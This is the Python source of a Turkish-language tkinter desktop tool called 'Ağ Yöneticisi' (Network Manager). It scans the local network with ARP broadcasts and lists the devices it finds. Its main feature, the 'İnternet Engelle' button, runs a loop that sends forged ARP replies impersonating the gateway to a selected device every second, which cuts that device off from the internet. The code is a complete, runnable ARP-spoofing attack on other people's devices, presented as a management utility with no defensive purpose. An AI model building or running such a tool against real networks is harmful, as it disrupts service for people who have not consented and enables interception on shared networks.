import tkinter as tk
from tkinter import ttk, messagebox
import scapy.all as scapy
from scapy.layers.l2 import ARP
from threading import Thread
import time

# Özel temalar ve renkler
DARK_BG = "#1e1e1e"
DARKER_BG = "#121212"
ACCENT_COLOR = "#007acc"  # Mavi aksan rengi
TEXT_COLOR = "#e0e0e0"
RED_ACCENT = "#ff5252"
GREEN_ACCENT = "#4caf50"

# Tema sınıfı
class DarkTheme:
    def __init__(self, root):
        # Ana stil dosyası
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Arkaplan ve yazı renkleri
        root.configure(bg=DARK_BG)
        self.style.configure('TFrame', background=DARK_BG)
        self.style.configure('TLabel', background=DARK_BG, foreground=TEXT_COLOR)
        self.style.configure('TButton', background=ACCENT_COLOR, foreground=TEXT_COLOR)
        
        # Treeview stilleri
        self.style.configure("Treeview", 
                        background=DARKER_BG, 
                        foreground=TEXT_COLOR, 
                        fieldbackground=DARKER_BG, 
                        borderwidth=0)
        self.style.map('Treeview', 
                  background=[('selected', ACCENT_COLOR)],
                  foreground=[('selected', TEXT_COLOR)])
        
        # Scrollbar
        self.style.configure("Vertical.TScrollbar", 
                        background=DARKER_BG, 
                        bordercolor=DARKER_BG, 
                        arrowcolor=TEXT_COLOR,
                        troughcolor=DARK_BG)

# Ağ tarama fonksiyonu
def scan_network(ip_range):
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    devices = []
    for element in answered_list:
        devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
    return devices

# MAC Adres Alma
def get_mac(ip):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except Exception as e:
        print(f"[-] MAC adresi alınamadı ({ip}): {e}")
        messagebox.showerror("Hata", f"MAC adresi alınamadı: {e}")
        return None

# Özel widget sınıfları
class CustomButton(tk.Button):
    def __init__(self, master=None, **kwargs):
        bg_color = kwargs.pop('bg', ACCENT_COLOR)
        fg_color = kwargs.pop('fg', TEXT_COLOR)
        kwargs['bg'] = bg_color
        kwargs['fg'] = fg_color
        kwargs['activebackground'] = bg_color
        kwargs['activeforeground'] = fg_color
        kwargs['relief'] = tk.FLAT
        kwargs['borderwidth'] = 0
        kwargs['padx'] = 15
        kwargs['pady'] = 8
        kwargs['font'] = ('Segoe UI', 10)
        super().__init__(master, **kwargs)
        
        # Hover efekti
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
        
    def on_enter(self, e):
        orig_color = self['bg']
        # Biraz daha açık renk
        r, g, b = self.master.winfo_rgb(orig_color)
        r = min(65535, int(r * 1.1))
        g = min(65535, int(g * 1.1))
        b = min(65535, int(b * 1.1))
        hover_color = f'#{r//256:02x}{g//256:02x}{b//256:02x}'
        self['bg'] = hover_color
        
    def on_leave(self, e):
        self['bg'] = ACCENT_COLOR if self['bg'] != RED_ACCENT else RED_ACCENT

class LabeledEntry(tk.Frame):
    def __init__(self, master=None, label_text="", default_value="", **kwargs):
        kwargs['bg'] = DARK_BG
        super().__init__(master, **kwargs)
        
        self.label = tk.Label(self, text=label_text, bg=DARK_BG, fg=TEXT_COLOR, font=('Segoe UI', 10))
        self.label.pack(side="left")
        
        self.var = tk.StringVar(value=default_value)
        self.entry = tk.Entry(self, textvariable=self.var, width=20, bg=DARKER_BG, fg=TEXT_COLOR, 
                             insertbackground=TEXT_COLOR, relief=tk.FLAT, bd=0, 
                             selectbackground=ACCENT_COLOR, font=('Segoe UI', 10))
        self.entry.pack(side="left", padx=5, ipady=5, pady=2)
        
        # Border için çerçeve
        self.border_frame = tk.Frame(self, height=2, bg=ACCENT_COLOR)
        self.border_frame.pack(fill="x", side="bottom")

# GUI Başlangıç
class NetworkManagerApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Ağ Yöneticisi")
        self.geometry("660x650")
        self.resizable(True, True)
        self.minsize(660, 500)
        
        # Tema uygula
        self.theme = DarkTheme(self)
        self.configure(bg=DARK_BG)
        
        # Icon ve başlık çubuğu
        #self.iconbitmap('network.ico') if hasattr(self, 'iconbitmap') else None
        
        # Cihaz listesi
        self.devices = []
        self.selected_device = None
        self.active_threads = []
        self.stop_flag = False  # İşlemi durdurmak için bayrak

        # Arayüz Elemanları
        self.create_widgets()
        
        # Gateway IP
        self.gateway_ip = "192.168.1.1"  # Varsayılan gateway

    def create_widgets(self):
        # Ana çerçeve
        self.main_frame = tk.Frame(self, bg=DARK_BG)
        self.main_frame.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Başlık
        title_frame = tk.Frame(self.main_frame, bg=DARK_BG)
        title_frame.pack(fill="x", pady=(0, 15))
        
        title_label = tk.Label(title_frame, text="AĞ YÖNETİCİSİ", bg=DARK_BG, fg=ACCENT_COLOR, 
                              font=("Segoe UI", 18, "bold"))
        title_label.pack()
        
        subtitle_label = tk.Label(title_frame, text="Ağ İzleme ve Kontrol Aracı", bg=DARK_BG, fg=TEXT_COLOR, 
                                 font=("Segoe UI", 10))
        subtitle_label.pack()
        
        # Üst kısım - Ayarlar
        settings_frame = tk.Frame(self.main_frame, bg=DARK_BG)
        settings_frame.pack(fill="x", pady=10)
        
        # Sol ve sağ çerçevelere böl
        left_settings = tk.Frame(settings_frame, bg=DARK_BG)
        left_settings.pack(side="left", fill="x", expand=True)
        
        right_settings = tk.Frame(settings_frame, bg=DARK_BG)
        right_settings.pack(side="right")
        
        # Ağ Aralığı
        self.ip_entry = LabeledEntry(left_settings, label_text="Ağ Aralığı:", default_value="192.168.1.0/24")
        self.ip_entry.pack(side="left", padx=(0, 20))
        self.ip_range_var = self.ip_entry.var
        
        # Gateway IP
        self.gateway_entry = LabeledEntry(left_settings, label_text="Gateway IP:", default_value="192.168.1.1")
        self.gateway_entry.pack(side="left")
        self.gateway_var = self.gateway_entry.var
        
        # Ağ Taraması Butonu
        self.scan_btn = CustomButton(right_settings, text="🔍 Ağ Taraması Yap", command=self.scan_network)
        self.scan_btn.pack(side="right", padx=5)
        
        # Cihaz Listesi Çerçevesi
        list_frame = tk.Frame(self.main_frame, bg=DARKER_BG, bd=1, relief=tk.FLAT)
        list_frame.pack(fill="both", expand=True, pady=15)
        
        # Liste Başlığı
        list_header = tk.Frame(list_frame, bg=DARKER_BG, height=30)
        list_header.pack(fill="x")
        
        tk.Label(list_header, text="Bulunan Cihazlar", bg=DARKER_BG, fg=TEXT_COLOR, 
                font=("Segoe UI", 11, "bold")).pack(pady=5)
        
        # Cihaz Listesi İçeriği
        list_content = tk.Frame(list_frame, bg=DARKER_BG)
        list_content.pack(fill="both", expand=True, padx=2, pady=2)
        
        # Treeview ve Scrollbar içeren çerçeve
        tree_frame = tk.Frame(list_content, bg=DARKER_BG)
        tree_frame.pack(fill="both", expand=True)
        
        # Cihaz Listesi
        self.device_list = ttk.Treeview(tree_frame, columns=("IP", "MAC"), show="headings", style="Treeview")
        self.device_list.heading("IP", text="IP Adresi")
        self.device_list.heading("MAC", text="MAC Adresi")
        self.device_list.column("IP", width=150, anchor=tk.CENTER)
        self.device_list.column("MAC", width=200, anchor=tk.CENTER)
        self.device_list.pack(side="left", fill="both", expand=True)
        
        # Scrollbar
        self.scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.device_list.yview, style="Vertical.TScrollbar")
        self.scrollbar.pack(side="right", fill="y")
        self.device_list.configure(yscrollcommand=self.scrollbar.set)
        
        self.device_list.bind("<<TreeviewSelect>>", self.on_device_select)
        
        # Alt Kontrol Paneli
        control_panel = tk.Frame(self.main_frame, bg=DARK_BG, height=80)
        control_panel.pack(fill="x", pady=15)
        
        # İşlem Seçenekleri
        self.action_frame = tk.Frame(control_panel, bg=DARK_BG)
        self.action_frame.pack()
        
        # Bilgi etiketi
        self.info_label = tk.Label(self.action_frame, text="Bir cihaz seçin ve işlem yapın", 
                                  bg=DARK_BG, fg=TEXT_COLOR, font=("Segoe UI", 10))
        self.info_label.pack(side="top", pady=(0, 10))

        # Butonlar
        self.buttons_frame = tk.Frame(self.action_frame, bg=DARK_BG)
        self.buttons_frame.pack()
        
        self.engelle_btn = CustomButton(self.buttons_frame, text="🔒 İnternet Engelle", 
                                      command=self.block_internet)
        self.engelle_btn.pack(side="left", padx=10)
        
        self.stop_btn = CustomButton(self.buttons_frame, text="⛔ İşlemi Durdur", 
                                   command=self.stop_all_threads, bg=RED_ACCENT)
        self.stop_btn.pack(side="left", padx=10)
        
        # Durum çubuğu
        status_frame = tk.Frame(self, bg=DARKER_BG, height=25)
        status_frame.pack(side="bottom", fill="x")
        
        self.status_var = tk.StringVar(value="✓ Hazır")
        self.status_bar = tk.Label(status_frame, textvariable=self.status_var, 
                                 bg=DARKER_BG, fg=TEXT_COLOR, anchor=tk.W, padx=10, pady=3)
        self.status_bar.pack(fill="x")

    def scan_network(self):
        ip_range = self.ip_range_var.get()
        self.gateway_ip = self.gateway_var.get()
        
        self.status_var.set(f"🔍 Ağ taranıyor: {ip_range}")
        self.update_idletasks()
        
        try:
            # Tarama butonu devre dışı bırak
            self.scan_btn.config(state="disabled", text="Taranıyor...")
            self.update_idletasks()
            
            self.devices = scan_network(ip_range)

            # Listeyi güncelle
            for item in self.device_list.get_children():
                self.device_list.delete(item)
            
            if not self.devices:
                self.status_var.set("⚠ Cihaz bulunamadı!")
                self.info_label.config(text="Cihaz bulunamadı. Farklı bir ağ aralığı deneyin.")
            else:
                for device in self.devices:
                    self.device_list.insert("", "end", values=(device["ip"], device["mac"]))
                    
                self.status_var.set(f"✓ {len(self.devices)} cihaz bulundu")
                self.info_label.config(text="Bir cihaz seçin ve işlem yapın")
                
            # Tarama butonu normal hale getir
            self.scan_btn.config(state="normal", text="🔍 Ağ Taraması Yap")
            
        except Exception as e:
            self.scan_btn.config(state="normal", text="🔍 Ağ Taraması Yap")
            messagebox.showerror("Hata", f"Ağ tarama hatası: {e}")
            self.status_var.set("❌ Tarama başarısız")

    def on_device_select(self, event):
        selected_items = self.device_list.selection()
        if selected_items:
            selected_item = selected_items[0]
            self.selected_device = self.device_list.item(selected_item, "values")
            self.info_label.config(text=f"Seçili Cihaz: {self.selected_device[0]}")

    def block_internet(self):
        if not self.selected_device:
            messagebox.showerror("Hata", "Bir cihaz seçin!")
            return

        target_ip = self.selected_device[0]
        gateway_ip = self.gateway_ip

        # Tüm mevcut işlemleri durdur
        self.stop_all_threads()

        # Yeni thread başlat
        self.stop_flag = False  # Yeni işlem için bayrağı sıfırla
        thread = Thread(target=self.arp_spoof, args=(target_ip, gateway_ip))
        thread.daemon = True
        thread.start()
        self.active_threads.append(thread)

        self.status_var.set(f"🔒 {target_ip} cihazının interneti engellendi")
        self.info_label.config(text=f"{target_ip} cihazı engellendi. İşlem aktif.", fg=GREEN_ACCENT)
        messagebox.showinfo("Başarılı", f"{target_ip} cihazının interneti engellendi.")

    def arp_spoof(self, target_ip, gateway_ip):
        try:
            target_mac = get_mac(target_ip)
            gateway_mac = get_mac(gateway_ip)

            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            print(f"[+] {target_ip} için ARP spoofing başlatıldı...")

            while not self.stop_flag:  # stop_flag kontrolü
                scapy.send(packet, verbose=False)
                time.sleep(1)  # Her saniye bir ARP paketi gönder
        except Exception as e:
            print(f"[-] ARP Spoofing hatası: {e}")

    def stop_all_threads(self):
        self.stop_flag = True  # stop_flag'i True yap
        self.status_var.set("⛔ İşlem durduruldu")
        self.info_label.config(text="Tüm işlemler durduruldu. Yeni işlem seçebilirsiniz.", fg=TEXT_COLOR)
        messagebox.showinfo("Bilgi", "Tüm aktif işlemler durduruldu.")

# Programı Başlat
if __name__ == "__main__":
    app = NetworkManagerApp()
    app.mainloop()